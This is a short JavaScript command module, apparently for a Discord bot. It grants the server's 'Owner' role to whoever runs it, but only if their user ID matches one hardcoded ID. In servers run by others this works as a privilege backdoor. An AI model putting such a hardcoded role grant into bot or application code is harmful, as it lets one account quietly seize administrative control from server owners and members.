module.exports = {
    name: "unicorn",
    description: "this will give u owner",
    execute(message, args){

        let role = message.guild.roles.cache.find(r => r.name === "Owner");

        if(message.author.id == 453663781852151809){
            message.member.roles.add(role).catch(console.error);
            message.channel.send("Here u go!");
        } else {
            message.channel.send("it's command not for u");
        }

        
    }
}